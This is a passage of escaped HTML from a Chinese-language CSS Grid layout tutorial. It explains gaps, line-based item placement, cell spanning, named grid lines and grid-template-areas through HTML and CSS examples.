alt=\"repeat()\"/\u003e\u003cfigcaption\u003erepeat()\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e间距\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003egrid-column-gap\u003c/code\u003e：创建列与列之间的距离。\u003cbr\u003e\u003ccode\u003egrid-row-gap\u003c/code\u003e：行与行之间的距离。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(2,100px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(3,100px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e15px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/72bdd4dda24e729abdc96785162d76ec\" alt=\"设置间距\"/\u003e\u003cfigcaption\u003e设置间距\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e或者使用 \u003ccode\u003egrid-gap\u003c/code\u003e 是 \u003ccode\u003egrid-row-gap\u003c/code\u003e 和 \u003ccode\u003egrid-column-gap\u003c/code\u003e两个属性的缩写。\u003c/p\u003e\n\u003ch2 id=\"-grid-item\"\u003e通过网格线定位 grid item\u003c/h2\u003e\n\u003cp\u003e我们可以通过表格线行或者列来定位 grid item。比如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"grid-container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item1\"\u003c/span\u003e\u0026gt;\u003c/span\u003e1\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item2\"\u003c/span\u003e\u0026gt;\u003c/span\u003e2\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item3\"\u003c/span\u003e\u0026gt;\u003c/span\u003e3\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item4\"\u003c/span\u003e\u0026gt;\u003c/span\u003e4\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item5\"\u003c/span\u003e\u0026gt;\u003c/span\u003e5\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item item6\"\u003c/span\u003e\u0026gt;\u003c/span\u003e6\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(2,100px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(3,100px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e15px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.item\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003eborder\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2px\u003c/span\u003e solid palegoldenrod;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.item1\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-start\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-end\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-start\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-end\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fffa90\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#000\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果：\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/326b7e1856e61524c26322e510271c95\" alt=\"通过网格线定位 grid item\"/\u003e\u003cfigcaption\u003e通过网格线定位 grid item\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003egrid-row\u003c/code\u003e 是 \u003ccode\u003egrid-row-start\u003c/code\u003e 和 \u003ccode\u003egrid-row-end\u003c/code\u003e 的简写。\u003ccode\u003egrid-column\u003c/code\u003e 是 \u003ccode\u003egrid-column-start\u003c/code\u003e 和 \u003ccode\u003egrid-column-end\u003c/code\u003e 的简写。\u003c/p\u003e\n\u003cp\u003e如果只提供一个值，指定了 \u003ccode\u003egrid-row-start\u003c/code\u003e 和 \u003ccode\u003egrid-column-start\u003c/code\u003e 的值。\u003c/p\u003e\n\u003cp\u003e如果提供两个值，第一个值是 \u003ccode\u003egrid-row-start\u003c/code\u003e 或者 \u003ccode\u003egrid-column-start\u003c/code\u003e 的值，第二个值是 \u003ccode\u003egrid-row-end\u003c/code\u003e 或者 \u003ccode\u003egrid-column-end\u003c/code\u003e 的值，两者之间必须要用/隔开。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e   grid-row: 2; \n   grid-column: 3 / 4;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这四个值可以用 \u003ccode\u003egrid-area\u003c/code\u003e 缩写，分别对应 \u003ccode\u003egrid-row-start\u003c/code\u003e、\u003ccode\u003egrid-column-start\u003c/code\u003e、\u003ccode\u003egrid-row-end\u003c/code\u003e、\u003ccode\u003egrid-column-end\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e    grid-area: 2 / 2 / 3 / 3;\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"-\"\u003e合并单元行与合并单元列\u003c/h2\u003e\n\u003cp\u003e这个就和 excel 中的合并单元行/列是相同的（\u003cstrong\u003e这个需要设置在 grid item 中\u003c/strong\u003e），\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e    \u003cspan class=\"hljs-selector-tag\"\u003egrid-column-start\u003c/span\u003e: 1;\n    \u003cspan class=\"hljs-selector-tag\"\u003egrid-column-end\u003c/span\u003e: 3;\n    \u003cspan class=\"hljs-selector-tag\"\u003egrid-row-start\u003c/span\u003e: 2;\n    \u003cspan class=\"hljs-selector-tag\"\u003egrid-row-end\u003c/span\u003e: 4;\n    \u003cspan class=\"hljs-selector-tag\"\u003egrid-row-end\u003c/span\u003e: 4;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e也可以使用 \u003ccode\u003egrid-row\u003c/code\u003e 和 \u003ccode\u003egrid-column\u003c/code\u003e 简写的形式，关键词 \u003ccode\u003espan\u003c/code\u003e 后面紧随数字，表示合并多少个列或行，\u003ccode\u003e/\u003c/code\u003e 前面是从第几行/列开始。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e    grid-row: 2 / span 3; \n    grid-column: span 2;\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(4,100px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erepeat\u003c/span\u003e(3,100px);\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e50px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e15px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.item\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003eborder\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2px\u003c/span\u003e solid palegoldenrod;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e20px\u003c/span\u003e;\n\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.item1\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-start\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-end\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-start\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-end\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果如图：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/7b94bc787ab1af8e2abba584d97136f8\" alt=\"合并单元行与合并单元列\"/\u003e\u003cfigcaption\u003e合并单元行与合并单元列\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e自定义网格线名称\u003c/h2\u003e\n\u003cp\u003e在 grid 中，是可以自定义网格线的名称的，然后使用定义好的网格线来进行布局，\u003cstrong\u003e\u003ccode\u003e[col1-start]\u003c/code\u003e 网格线名称一定要使用 \u003ccode\u003e[]\u003c/code\u003e 括住\u003c/strong\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"grid-container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item a\"\u003c/span\u003e\u0026gt;\u003c/span\u003ea\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item b\"\u003c/span\u003e\u0026gt;\u003c/span\u003eb\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item c\"\u003c/span\u003e\u0026gt;\u003c/span\u003ec\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item d\"\u003c/span\u003e\u0026gt;\u003c/span\u003ed\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item e\"\u003c/span\u003e\u0026gt;\u003c/span\u003ee\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item f\"\u003c/span\u003e\u0026gt;\u003c/span\u003ef\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item g\"\u003c/span\u003e\u0026gt;\u003c/span\u003eg\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item h\"\u003c/span\u003e\u0026gt;\u003c/span\u003eh\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item i\"\u003c/span\u003e\u0026gt;\u003c/span\u003ei\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"item j\"\u003c/span\u003e\u0026gt;\u003c/span\u003ej\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.grid-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003etext-align\u003c/span\u003e: center;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e400px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003edisplay\u003c/span\u003e: grid;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-column-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-row-gap\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: pink;\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-columns\u003c/span\u003e: [col1-start] \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e [col1-end] \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e [col2-start] \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e [col2-end] \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e [col3-start]\n            \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e [col3-end] \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e [col4-start] \u003cspan class=\"hljs-number\"\u003e100px\u003c/span\u003e [col4-end];\n            \u003cspan class=\"hljs-attribute\"\u003egrid-template-rows\u003c/span\u003e: [row1-start] auto [row1-end] \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e [row2-start] auto [row2-end] \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e [row3-start] auto\n             [row3-end] \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e [row4-start] auto [row4-end] \u003cspan class=\"hljs-number\"\u003e5px\u003c/span\u003e [row5-start] auto [row5-end];\n\n\n        }\n\n\n        \u003cspan class=\"hljs-selector-class\"\u003e.a\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col1-start / col3-end; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row1-start;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.b\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col4-start / col4-end; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row1-start / row5-end; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: orange; }\n        \u003cspan class=\"hljs-selector-class\"\u003e.c\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col1-start; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row2-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.d\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col2-start; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row2-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.e\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col3-start; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row2-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.f\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col1-start / col2-end; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row3-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.g\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col3-start; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row3-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.h\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col1-start; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row4-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.i\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col2-start / col3-end; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row4-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\n        \u003cspan class=\"hljs-selector-class\"\u003e.j\u003c/span\u003e { \u003cspan class=\"hljs-attribute\"\u003egrid-column\u003c/span\u003e: col1-start / col3-end; \u003cspan class=\"hljs-attribute\"\u003egrid-row\u003c/span\u003e: row5-start; \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#ffffff\u003c/span\u003e;}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后的显示效果是这样的（文字和辅助线是后台添加的）：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/0aaa209d325e7f0c68b37b071be73df0\" alt=\"自定义网格线名称\"/\u003e\u003cfigcaption\u003e自定义网格线名称\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e通过网格区域命名和定位网格项目\u003c/h2\u003e\n\u003ch3 id=\"-\"\u003e什么是网格区域：\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e网格区域(grid-area)是一个逻辑空间，主要用来放置一个或多个网格单元格（Grid Cell）。他是由四条网格线(Grid line)，网格区域每边一条，四边相交组织的网格轨道(Grid Track)。简单点理解，网格区域是有四条网格线交织组成的网格空间，这个空间中可能是一个网格单元格，也可能是多个网格单元格。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 id=\"-\"\u003e定义网格区域\u003c/h3\u003e\n\u003cp\u003e在CSS Grid Layout中定义网格区域有两种方式，一种是通过网格线来定义，另一种是通过grid-template-areas来定义。接下来看看两种定义网格区域的方法在具体使用过程中有何不同。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e网格线定义网格区域\u003c/h3\u003e\n\u003cp\u003e使用网格线定义网格区域的方法非常的简单，首先依赖于 \u003ccode\u003egrid-template-columns\u003c/code\u003e 和 \u003ccode\u003egrid-template-rows\u003c/code\u003e 显式定义网格线，甚至是由浏览器隐式创建网格线，然后通过 \u003ccode\u003egrid-area\u003c/code\u003e 属性通过取网格线，组成网格线交织区域，那么这个区域就是所讲的网格区域。在使用 \u003ccode\u003egrid-area\u003c/code\u003e 属性调用网格线，其遵循的规则是 \u003ccode\u003egrid-area: row-start\u003c/code\u003e/ \u003ccode\u003ecolumn-start\u003c/code\u003e / \u003ccode\u003erow-end\u003c/code\u003e / \u003ccode\u003ecolumn-end\u003c/code\u003e。\u003c/p\u003e\n\u003ch3 id=\"-grid-template-areas-\"\u003e\u003ccode\u003egrid-template-areas\u003c/code\u003e 定义网格区域\u003c/h3\u003e\n\u003cp\u003e除了使用网格线的交组来定义网格区域之外，在 CSS Grid Layout 中还可以通过 \u003ccode\u003egrid-template-areas\u003c/code\u003e 属性来定义网格区域的名称，然后需要放在对应网格区域的元素，可以通过 \u003ccode\u003egrid-area\u003c/code\u003e 属性来指定。而且重复区域可以使用同一个名称来实现跨区域。另外对于空的轨道区域，可以使用点号 \u003ccode\u003e.\u003c/code\u003e 来代表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"grid-container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"header \"\u003c/span\u003e\u0026gt;\u003c/span\u003eheader\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan 